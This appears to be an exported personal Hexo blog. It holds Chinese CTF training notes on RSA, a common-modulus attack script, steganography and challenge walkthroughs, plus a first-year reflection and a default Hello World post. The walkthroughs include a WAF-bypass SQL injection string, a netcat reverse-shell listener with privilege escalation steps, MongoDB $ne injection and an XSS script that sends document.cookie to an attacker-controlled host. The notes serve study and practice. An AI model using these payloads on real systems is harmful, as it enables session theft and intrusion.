RSA<br>•RSA的算法涉及三个参数，n、e1、e2。<br>•其中，n是两个大质数p、q的积，n的二进制表示时所占用的位数，就是所谓的密钥长度。<br>•e1和e2是一对相关的值，e1可以任意取，但要求e1与(p-1）<em>(q-1）互质；再选择e2，要求（e2</em>e1）mod((p-1）*(q-1））=1。<br>•（n，e1）,(n，e2）就是密钥对。其中(n，e1）为公钥，(n，e2）为私钥。<br>•RSA加解密的算法完全相同，设A为明文，B为密文，则：A=B^e2    mod    n；B=A^e1    mod    n；（公钥加密体制中，一般用公钥加密，私钥解密）•e1和e2可以互换使用，即：<br>•A=B^e1    mod    n；B=A^e2    mod    n;<br>因式分解n （也可用于判断质数）<br><a href=\"http://factordb.com/\" target=\"_blank\" rel=\"external\">http://factordb.com/</a><br>小工具 Yafu:Factor(数字) （拖到命令行运行不然结束后会闪退貌似）<br>低加密指数（e）攻击（也称小e攻击）<br>选择密文攻击<br>共模攻击<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div></pre></td><td class=\"code\"><pre><div class=\"line\">#coding=utf-8</div><div class=\"line\">def egcd(a, b):</div><div class=\"line\">  if a == 0:</div><div class=\"line\">    return (b, 0, 1)</div><div class=\"line\">  else:</div><div class=\"line\">    g, y, x = egcd(b % a, a)</div><div class=\"line\">    return (g, x - (b // a) * y, y)</div><div class=\"line\">def modinv(a, m):</div><div class=\"line\">  g, x, y = egcd(a, m)</div><div class=\"line\">  if g != 1:</div><div class=\"line\">    raise Exception(&apos;modular inverse does not exist&apos;)</div><div class=\"line\">  else:</div><div class=\"line\">    return x % m</div><div class=\"line\">def main():</div><div class=\"line\">  n = int(raw_input(&quot;input n:&quot;))</div><div class=\"line\">  c1 = int(raw_input(&quot;input c1:&quot;))</div><div class=\"line\">  c2 = int(raw_input(&quot;input c2:&quot;))</div><div class=\"line\">  e1 = int(raw_input(&quot;input e1:&quot;))</div><div class=\"line\">  e2 = int(raw_input(&quot;input e2:&quot;))</div><div class=\"line\">  s = egcd(e1, e2)</div><div class=\"line\">  s1 = s[1]</div><div class=\"line\">  s2 = s[2]</div><div class=\"line\">  # 求模反元素</div><div class=\"line\">  if s1&lt;0:</div><div class=\"line\">    s1 = - s1</div><div class=\"line\">    c1 = modinv(c1, n)</div><div class=\"line\">  elif s2&lt;0:</div><div class=\"line\">    s2 = - s2</div><div class=\"line\">    c2 = modinv(c2, n)</div><div class=\"line\">  m = (c1**s1)*(c2**s2)%n</div><div class=\"line\">  print m</div><div class=\"line\">if __name__ == &apos;__main__&apos;:</div><div class=\"line\">  main()</div></pre></td></tr></table></figure></p>\n<p>文件及数据库加密<br>mysql user.MYD<br>Access数据库<br>压缩包zip，rar的暴力破解</p>\n<p>crypto_end…<br>感觉挺系统的吧，涨各种解密以及暴力姿势<br>都是工具，都是套路，一难就GG（比如最后讲解的那题。。数学从高中就不好了/手动再见）</p>\n<h2 id=\"day5-misc\"><a href=\"#day5-misc\" class=\"headerlink\" title=\"day5 misc\"></a>day5 misc</h2><p>文件的作者，修改日期，属性，标签等等，都是属于文件的元数据<br>Windows上可直接通过右键查看元数据，Linux上可通过exiftool工具查看<br>文件末尾追加数据 Copy /b 1.png + 1.txt 2.png<br>可以使用十六进制编辑器查看如Winhex，Linux下可使用binwalk或者foremost工具进行文件分离<br>HTML信息隐藏 浏览器在解析HTML时会忽略行尾或HTML标记后的空白符号，但不会影响浏览器的显示结果的特点<br>LSB隐写就是修改了像数中的最低的1bit，在人眼看来是看不出来区别的，也把信息隐藏起来了<br>善用py的图形处理功能 PIL Image<br>注意二维码脑洞<br>音频信息隐写<br>MP3Stego：将隐藏文件和WAV文件合成一个MP3文件<br>MSU SetgoVideo：一个免费非开源的隐写工具，能够在全动态视频中隐写信息<br>TCStego：纯Python开发，以QuickTime和MP4多媒体容器作为载体隐藏信息<br>网络协议信息隐藏<br>ICMP协议隐写<br>TTL字段隐写<br>HTTP协议隐写：<br>空白隐写术：在传输的文本末尾附加空白和TAB等不可见字符，空格表示0，TAB表示1<br>大小写混排编码<br>非默认首字段值：发送请求时有些字段浏览器会添加一些默认值，可以修改默认值为01等要隐写的数据<br>自定义消息报头域：对于服务器无法识别的请求头服务器会忽略掉，可以自定义请求头字段来隐藏秘密信息<br>二进制对象排序隐藏：设置HTTP请求头排序的基准报文，然后对这些请求头进行编码排序或者删除隐藏信息<br>流量分析 参考书籍：《TCP/IP详解卷一：协议》<br>WireShark<br>ZIP伪加密</p>\n<h2 id=\"day6-考核\"><a href=\"#day6-考核\" class=\"headerlink\" title=\"day6 考核\"></a>day6 考核</h2><p>哇这种web虐萌新啊QAQ<br>哇别的题怎么就那么友好<br>哇又是好多原题==<br>哇到处都是py==</p>\n<h2 id=\"day7-讲解\"><a href=\"#day7-讲解\" class=\"headerlink\" title=\"day7 讲解\"></a>day7 讲解</h2><p>总而言之窝怎么啥都不造啊。。。瑟瑟发抖嘤嘤嘤QAQQQQQQQQQQQ</p>\n<h3 id=\"原题\"><a href=\"#原题\" class=\"headerlink\" title=\"原题\"></a>原题</h3><p><a href=\"http://www.cnblogs.com/deen-/p/7148071.html\" target=\"_blank\" rel=\"external\">这儿有两题</a></p>\n<h3 id=\"waf\"><a href=\"#waf\" class=\"headerlink\" title=\"waf\"></a>waf</h3><p><code>/**/union/**/select/**/1,(selEct/**/...limit 0,1),3,4,5#</code><br>爆表<br>爆字段,爆flag。。。这种注释没见过吖QAQ<br>（SQL注入攻击与防御，web前端黑客技术揭秘，黑客攻防技术宝典）</p>\n<h3 id=\"exploit\"><a href=\"#exploit\" class=\"headerlink\" title=\"exploit\"></a>exploit</h3><p>nc -lvvp 4444 反弹webshell。。。喵喵喵？<br>id<br>python 啥啥啥。。。沃日讲这么快干啥啊。。。<br>uname -a查看版本<br>在www.exploit-db.com上搜漏洞<br>传对应文件（temp是任何人都能写的）<br>gcc编译<br>执行<br>root权限了</p>\n<h3 id=\"be-allowed\"><a href=\"#be-allowed\" class=\"headerlink\" title=\"be allowed\"></a>be allowed</h3><p>改x-forwared-for: localhost<br>robots.txt<br>/message/<br>username加js恶意代码偷取cookie<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script&gt;</div><div class=\"line\">(new Image()).src=&quot;http://(加自己的那个啥)&quot;+document.cookie;</div><div class=\"line\">&lt;/script&gt;</div></pre></td></tr></table></figure></p>\n<p>提示a=id<br>a=4报错，order by注入</p>\n<h3 id=\"register\"><a href=\"#register\" class=\"headerlink\" title=\"register\"></a>register</h3><p>变量覆盖。。。连自己的数据库。。。还有这种操作。。</p>\n<h3 id=\"研究生的秘密\"><a href=\"#研究生的秘密\" class=\"headerlink\" title=\"研究生的秘密\"></a>研究生的秘密</h3><p>mongodb注入<br>title[$ne]=…就好啦？？？</p>\n<h3 id=\"manager1\"><a href=\"#manager1\" class=\"headerlink\" title=\"manager1\"></a>manager1</h3><p>导入带引号的csv<br>发现报错，SQL注入，会转成json<br>insert注入</p>\n<h3 id=\"manager2\"><a href=\"#manager2\" class=\"headerlink\" title=\"manager2\"></a>manager2</h3><p>上传文件带入绝对路径<br>修改path<br>读取Apache的httpd.conf发现同服务器存在另一个站点<br>修改host文件访问</p>\n<h2 id=\"回家家。。。\"><a href=\"#回家家。。。\" class=\"headerlink\" title=\"回家家。。。\"></a>回家家。。。</h2><p>发现安恒老板居然是金华的窝也是惊了<br>web汪吼可怜啊 窝好菜啊<br>另外终于喝到了网红奶茶 一點點入喉心作痛2333</p>\n<p>END<br><br></p>\n","categories":["Blog"],"tags":["搅屎棍之路"]},{"title":"大一の瞎几把扯","url":"http://ringfall.me/2017/07/22/dy/","content":"<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>感慨时间好快什么的应该不是窝的画风，然而不写些什么，就好像一年一年凭空划过了无痕迹，虽然自己也有知识和阅历的增长，可却像是十年不如一日，还是那个又蠢又懒的窝QAQ</p>\n<h2 id=\"0x01-搅屎棍之路\"><a href=\"#0x01-搅屎棍之路\" class=\"headerlink\" title=\"0x01 搅屎棍之路\"></a>0x01 搅屎棍之路</h2><p>能在第一天遇见师父父真的是超~幸运的事呀，那时候带路哒胖胖学长的头像还是傲娇大小姐凛，于是和文学姐聊啊聊也特别舒服2333（哪像现在，整天凶唧唧，口亨）<br>然后就莫名入坑啦ctf？因为师父父嗦超好玩而且可以当大黑阔~<br>现在想想那时真是好骗又naive，空有满脑子的YY而并不知前路艰险，毕竟无知者无畏，遑论当时自己貌似连编程是啥都不知道吧。。<br>不过那又有什么关系呐~懒散颓废了一个暑假的渣渣在拿到了师父父的C++书后，一时还是很有兴趣的~再加上军训真的好无聊==.就学的挺快，水群也水得挺欢。<br>后来大概是听从师父父“锻炼编程能力”的教导混迹于红太阳带领下的GAY…啊不不不，是ACM小组（其实只是围观顺便和徒儿儿愉快玩♂耍）也刷了一些OJ的一些水题为未来的一些实验课划水打下了基础///<br>然后呢，师父父剪短而零碎地教导了两三次吧，对这四年以及网络安全有了一丢丢迷迷糊糊的想法和认知，去了两次安全谷一是游玩观光(bu，二是为Appl3道长捧场~顺便记下了实训平台上某最最最简单的sql注入题的答案…还是很有收获的嗯！<br><br>寒假看了大部分的韩顺平哒世界上最好的语言——P(ai)H(uang)P(ian)视频教程（其中也有html、css，和数据库），前面部分挺有意思也很是清晰地描述了网络传输显示过程和php在网页中特殊之处（在服务器端运行出结果再返回，而别的比如html、js是直接返回到客户端再由浏览器显示），后面讲语法就觉得和C艹怎么蜜汁相像啊突然失去梦想变成咸鱼无聊刷课ing，不过好在寒假漫漫终于刷到了数据库，笔记做的那叫一个细致啊（现在看去大概都忘了QAQ）总之，这套教程看时只是零散地做了些笔记，最后在师父父督促下缭乱地写了个登录的界面算是练手。<br>（不造为啥在寒假之前师父的最初无修的任务居然是用php写个博客，大概是太高估窝惹2333 抱紧hexo瑟瑟发抖）<br>寒假后期在师父父指示下糊里糊涂地用神器burp勉强瞎做了南邮平台上前两排的“提示比较明显，考点比较单一”的题。诚然看着题目颜色变了的时候有一丝丝的喜悦然而内心真的挺懵的来着。。<br><br>大一下，三场校赛还阔以吧，特别是第一次师父父亲身教学就突然解锁了好多新姿势诶嘿嘿嘿嘿</p>\n<h3 id=\"first-get\"><a href=\"#first-get\" class=\"headerlink\" title=\"first_get\"></a>first_get</h3><p>sql注入基本流程<br>如何利用反序列化<br>Stegsolve的一些套路<br>打一整天比赛的疲惫</p>\n<h3 id=\"second-post\"><a href=\"#second-post\" class=\"headerlink\" title=\"second_post\"></a>second_post</h3><p>js小游戏玩♂法~<br>XSS平台用法<br>各种解码及解密<br>活捉一只厉害又热心哒宅宅小菲菲%%%<br>打一整天比赛的疲惫*2</p>\n<h4 id=\"third-include\"><a href=\"#third-include\" class=\"headerlink\" title=\"third_include\"></a>third_include</h4><p>菜刀的使用<br>依稀记得都差不多是简单的原题，没写WP就。。一点印象都没了2333<br>不要脸地和徒儿儿在acm实验室打的，因为有徒儿儿就一点也不累啦~</p>\n<p>总之还是有了那么一丢丢微妙的感觉了吧，另外就是在廖雪峰的网站看了看PYthon/斜眼笑，虽然自己编还是有困难但是大概可以看懂别人写的了，吧，大概QAQ</p>\n<h2 id=\"0x02-万恶的商家\"><a href=\"#0x02-万恶的商家\" class=\"headerlink\" title=\"0x02 万恶的商家\"></a>0x02 万恶的商家</h2><p>经历四轮面试存活确认，比较喜欢笔试那一轮哒题目，最后的那个辩论简直瑟瑟发抖。<br>认识了炒鸡厉害哒学姐和射基部特别特别gay的部长精心挑选且带领下更加更加gay的一群部员，虽然有些并没有怎么交流过但是感觉都是很棒哒小伙伴们~<br>（还和其中一只组队去水了个让鸡蛋飞的结构比赛，没帮上什么忙但还是很惊喜~）<br>茶话会当旁白讲了gay得不行的故事，看了各种可爱的节目~<br>在青协水了很多时长，一直很想去的支教还是因为各种原因没有达成QAQ<br>虽然之前勉强用过PS啊之类的，面试也把手绘板拿粗来嗦了一通，最后证明自己还是很不熟练啊2333，于是在校青协设计部的一年还是有很多的收获~AI哒矢量图也是超好用~<br>总而言之虽然商家要求真的是变幻莫测，从头修改的事也是日常，但所有的工作还是挺轻松的，大家的氛围也超棒，每周例会的吃的也！都！很！棒！</p>\n<h2 id=\"0x03-学吖学\"><a href=\"#0x03-学吖学\" class=\"headerlink\" title=\"0x03 学吖学\"></a>0x03 学吖学</h2><p>上学期很惨<br>下学期更惨<br>不知道为啥<br>明明高数那些上课有好好听的，结果居然喵喵喵？？？<br>明明英语一直很水电工上课日常被催眠大雾从来不预习最后瞎几把预习一通考的时候也特别没底居然分数还挺好看？<br>然后真心觉得煤大计算机的专业课考试太温柔了吧==<br>四级和600差一分然后六级飘过，感觉好久好久没学过英语了。。。完全靠老底在混<br>立个flag，碎觉就好好碎，有些反正是自学上课就憋听了，珍惜时间提高效率（写着写着就感觉要GG（扶额<br>慢悠悠慢悠悠~~~唉mmp从小这样叽窝有什么办法嘛</p>\n<h2 id=\"0x04-小姐姐\"><a href=\"#0x04-小姐姐\" class=\"headerlink\" title=\"0x04 小姐姐\"></a>0x04 小姐姐</h2><p>遇见了很多很棒的小姐姐<br>哈哈哈哈哈哈哈哈哈哈哈<br><br><br></p>\n","categories":["Blog"],"tags":["瞎几把扯"]},{"title":"hello~ringfall~","url":"http://ringfall.me/2017/07/18/hello-ringfall/","content":"<p>a test~<br>这里是蠢喵哒博客客~<br>哒建以及使用的过程中感谢小菲菲倾情资词~<br>感谢所有人(躺:D<br><br></p>\n","categories":[],"tags":["瞎几把扯"]},{"title":"Hello World","url":"http://ringfall.me/2017/07/18/hello-world/","content":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"external\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"external\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"external\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"external\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></div></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"external\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo server</div></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"external\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo generate</div></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"external\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo deploy</div></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"external\">Deployment</a></p>\n","categories":[],"tags":[]},{"title":"category","url":"http://ringfall.me/category/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://ringfall.me/search/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"http://ringfall.me/tag/index.html","content":"","categories":[],"tags":[]}]